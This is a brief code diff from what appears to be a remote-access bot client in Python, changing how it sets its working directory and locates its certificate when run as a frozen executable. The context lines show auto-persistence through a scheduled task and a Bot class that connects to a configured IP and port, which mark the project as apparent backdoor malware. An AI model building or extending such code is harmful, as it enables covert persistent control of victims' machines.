@@ -20,6 +20,10 @@ AUTO_PERSIST = auto_persist
 if AUTO_PERSIST:
  shell.Shell(None, None, None).create_task(None)
 
+# executable
+if hasattr(sys, 'frozen'):
+ chdir(path.dirname(sys.executable[:-2])) 
+
 # address
 IP = addr_ip 
 PORT = addr_port 
@@ -27,7 +31,7 @@ PORT = addr_port
 class Bot(object):
  
  def __init__(self, home):
-  self.cert = path.dirname(sys.executable[:-2]) + path.sep + 'public.crt' if hasattr(sys, 'frozen') else 'public.crt' 
+  self.cert = 'public.crt' 
   self.shell = None
   self.home = home
   self.conn = None 
